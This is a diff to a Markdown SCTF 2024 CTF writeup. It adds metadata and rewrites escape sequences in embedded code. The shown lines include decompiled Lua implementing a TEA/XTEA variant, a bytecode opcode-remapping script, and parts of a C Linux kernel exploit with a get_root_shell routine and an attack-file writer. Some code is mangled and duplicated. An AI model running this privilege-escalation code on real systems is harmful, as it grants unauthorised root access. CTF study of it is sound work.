@@ -99,6 +99,9 @@ prerequisites:
 - Lua 字节码 + unluac.jar + opmap 重写
 - TEA/XTEA 算法变种识别
 - Continued Fraction + LLL 算法
+contest_normalized: "SCTF"
+contest_year: 2024
+subcategory_guess: "reverse"
 ---
 # SCTF 2024 writeup by Arr3stY0u
 
@@ -155,7 +158,7 @@ b1 = instruction & 0xFFb2 = (instruction >> 8) & 0xFFb3 = (instruction >> 16) & 
 
 java -jar .unluac_2023_09_20.jar --opmap opmap.txt SGAME_3.luac
 
-local pctbbgf = function(str) local padding = 8 - #str % 8 return str .. string.rep(" 00", padding)endlocal fvcrtxrrr = function(byte1, byte2, byte3, byte4)return (byte1 or 0) << 24 | (byte2 or 0) << 16 | (byte3 or 0) << 8 | (byte4 or 0)endlocal efvcrte = function(str)local result = {}
+local pctbbgf = function(str) local padding = 8 - #str % 8 return str .. string.rep("\\x0000", padding)endlocal fvcrtxrrr = function(byte1, byte2, byte3, byte4)return (byte1 or 0) << 24 | (byte2 or 0) << 16 | (byte3 or 0) << 8 | (byte4 or 0)endlocal efvcrte = function(str)local result = {}
 for i = 1, #str, 8 do table.insert(result, fvcrtxrrr(str:
 byte(i, i + 3))) table.insert(result, fvcrtxrrr(str:
 byte(i + 4, i + 7)))endreturn resultendlocal defcve = function(uint)return string.char(uint >> 24 & 255, uint >> 16 & 255, uint >> 8 & 255, uint & 255)endlocal abcde = function(rrrrrrrrrrray)do return enddo return endlocal resultdo return enddo return enddodo return endlocal (for state), (for state), (for state), (for state)dodo return endlocal _, uintdo return enddo return enddo return enddo return enddo return enddo return endreturnenddo return endreturnenddo return enddo return enddo return enddo return enddo return endreturn nil, nil, nil, nil, nil, nil, nil, nil, nil, nilendfunction cdefa(v, arrrrrrrrrr)local cccccccccccccccc, ccccccccccccccccc = v[1], v[2]local cccccccccc = 0local cccccc = 2576980377for _ = 1, 42 do cccccccccc = cccccccccc + cccccc & 4294967295 cccccccccccccccc = cccccccccccccccc + ((ccccccccccccccccc << 4 ~ ccccccccccccccccc >> 5) + ccccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc & 3) + 1]) & 4294967295 ccccccccccccccccc = ccccccccccccccccc + ((cccccccccccccccc << 4 ~ cccccccccccccccc >> 5) + cccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc >> 11 & 3) + 1]) & 4294967295end cccccccccccccccc = cccccccccccccccc ~ 12 ccccccccccccccccc = ccccccccccccccccc ~ 18return {cccccccccccccccc, ccccccccccccccccc}endfunction bcdef(str, arrrrrrrrrr)local padded_str = pctbbgf(str)local uint32_rrrrrrrrrrray = efvcrte(padded_str)local encccderrrrrr = {}
@@ -411,7 +414,7 @@ return 1; }
 return 0;}
 
 #define _GNU_SOURCE#include <fcntl.h>#include #include <stdio.h>#include <stdlib.h>#include <sys/msg.h>#include <sys/syscall.h>#include <linux/userfaultfd.h>#include #include <sys/mman.h>#include <sys/ioctl.h>#include <semaphore.h>#include <sys/ipc.h>#include <stdint.h>
-#define COLOR_GREEN " 33[32m"#define COLOR_RED " 33[31m"#define COLOR_YELLOW " 33[33m"#define COLOR_DEFAULT " 33[0m"
+#define COLOR_GREEN "\\x0033[32m"#define COLOR_RED "\\x0033[31m"#define COLOR_YELLOW "\\x0033[33m"#define COLOR_DEFAULT "\\x0033[0m"
 #define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "n", __FILE__, __LINE__, ##__VA_ARGS__)#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define die(fmt, ...) do { loge(fmt, ##__VA_ARGS__); loge("Exit at line %d", __LINE__); exit(1); } while (0)
 void get_root_shell(void){if (getuid()) { die("Failed to get the root!"); }
 puts("[*] Successful to get the root. Execve root shell now..."); system("/bin/sh");exit(0);}
@@ -702,7 +705,7 @@ close()
 .op 0 gettabup.op 1 gettable.op 2 geti.op 3 getfield.op 4 settabup.op 5 settable.op 6 seti.op 7 setfield.op 8 newtable.op 9 self.op 10 addi.op 11 addk.op 12 subk.op 13 mulk.op 14 modk.op 15 powk.op 16 divk.op 17 idivk.op 18 bandk.op 19 bork.op 20 bxork.op 21 shri.op 22 shli.op 23 add.op 24 sub.op 25 mul.op 26 mod.op 27 pow.op 28 div.op 29 idiv.op 30 band.op 31 bor.op 32 bxor.op 33 shl.op 34 shr.op 35 mmbin.op 36 mmbini.op 37 mmbink.op 38 unm.op 39 bnot.op 40 not.op 41 len.op 42 concat.op 43 close.op 44 tbc.op 45 jmp.op 46 eq.op 47 lt.op 48 le.op 49 eqk.op 50 eqi.op 51 lti.op 52 lei.op 53 gti.op 54 gei.op 55 move.op 56 loadi.op 57 loadf.op 58 loadk.op 59 loadkx.op 60 loadfalse.op 61 lfalseskip.op 62 loadtrue.op 63 loadnil.op 64 getupval.op 65 setupval.op 66 test.op 67 testset.op 68 call.op 69 tailcall.op 70 return.op 71 return0.op 72 return1.op 73 forloop.op 74 forprep.op 75 tforprep.op 76 tforcall.op 77 tforloop.op 78 setlist.op 79 closure.op 80 vararg.op 81 varargprep.op 82 extraarg
 b1 = instruction & 0xFFb2 = (instruction >> 8) & 0xFFb3 = (instruction >> 16) & 0xFFb4 = (instruction >> 24) & 0xFFopcode = b2 & 0x7Fif opcode == 127: opcode = 45 b4 = 0x7Felif opcode == 0 and b4 == 1 and last_opcode in [46, 47, 48, 49, 50, 51, 52, 53, 54, 66, 67]: opcode = 45 b4 = 0x80last_opcode = opcodeob4 = b4ob3 = b3ob2 = (b1 >> 1) | (b2 & 0x80)ob1 = ((b1 & 1) << 7) | (opcode)instruction2 = (ob4 << 24) | (ob3 << 16) | (ob2 << 8) | ob1
 java -jar .unluac_2023_09_20.jar --opmap opmap.txt SGAME_3.luac
-local pctbbgf = function(str) local padding = 8 - #str % 8 return str .. string.rep(" 00", padding)endlocal fvcrtxrrr = function(byte1, byte2, byte3, byte4)return (byte1 or 0) << 24 | (byte2 or 0) << 16 | (byte3 or 0) << 8 | (byte4 or 0)endlocal efvcrte = function(str)local result = {}
+local pctbbgf = function(str) local padding = 8 - #str % 8 return str .. string.rep("\\x0000", padding)endlocal fvcrtxrrr = function(byte1, byte2, byte3, byte4)return (byte1 or 0) << 24 | (byte2 or 0) << 16 | (byte3 or 0) << 8 | (byte4 or 0)endlocal efvcrte = function(str)local result = {}
 for i = 1, #str, 8 do table.insert(result, fvcrtxrrr(str:
 byte(i, i + 3))) table.insert(result, fvcrtxrrr(str:
 byte(i + 4, i + 7)))endreturn resultendlocal defcve = function(uint)return string.char(uint >> 24 & 255, uint >> 16 & 255, uint >> 8 & 255, uint & 255)endlocal abcde = function(rrrrrrrrrrray)do return enddo return endlocal resultdo return enddo return enddodo return endlocal (for state), (for state), (for state), (for state)dodo return endlocal _, uintdo return enddo return enddo return enddo return enddo return enddo return endreturnenddo return endreturnenddo return enddo return enddo return enddo return enddo return endreturn nil, nil, nil, nil, nil, nil, nil, nil, nil, nilendfunction cdefa(v, arrrrrrrrrr)local cccccccccccccccc, ccccccccccccccccc = v[1], v[2]local cccccccccc = 0local cccccc = 2576980377for _ = 1, 42 do cccccccccc = cccccccccc + cccccc & 4294967295 cccccccccccccccc = cccccccccccccccc + ((ccccccccccccccccc << 4 ~ ccccccccccccccccc >> 5) + ccccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc & 3) + 1]) & 4294967295 ccccccccccccccccc = ccccccccccccccccc + ((cccccccccccccccc << 4 ~ cccccccccccccccc >> 5) + cccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc >> 11 & 3) + 1]) & 4294967295end cccccccccccccccc = cccccccccccccccc ~ 12 ccccccccccccccccc = ccccccccccccccccc ~ 18return {cccccccccccccccc, ccccccccccccccccc}endfunction bcdef(str, arrrrrrrrrr)local padded_str = pctbbgf(str)local uint32_rrrrrrrrrrray = efvcrte(padded_str)local encccderrrrrr = {}
@@ -937,7 +940,7 @@ return 1; }
 // 关闭文件 close(fd);printf("ELF code written to %s successfully.n", ATTACK_FILE); system("cp /busybox /bin/busybox;");
 return 0;}
     #define _GNU_SOURCE#include <fcntl.h>#include #include <stdio.h>#include <stdlib.h>#include <sys/msg.h>#include <sys/syscall.h>#include <linux/userfaultfd.h>#include #include <sys/mman.h>#include <sys/ioctl.h>#include <semaphore.h>#include <sys/ipc.h>#include <stdint.h>
-    #define COLOR_GREEN " 33[32m"#define COLOR_RED " 33[31m"#define COLOR_YELLOW " 33[33m"#define COLOR_DEFAULT " 33[0m"
+    #define COLOR_GREEN "\\x0033[32m"#define COLOR_RED "\\x0033[31m"#define COLOR_YELLOW "\\x0033[33m"#define COLOR_DEFAULT "\\x0033[0m"
     #define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "n", __FILE__, __LINE__, ##__VA_ARGS__)#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define die(fmt, ...) do { loge(fmt, ##__VA_ARGS__); loge("Exit at line %d", __LINE__); exit(1); } while (0)
 void get_root_shell(void){if (getuid()) { die("Failed to get the root!"); }
 puts("[*] Successful to get the root. Execve root shell now..."); system("/bin/sh");exit(0);}
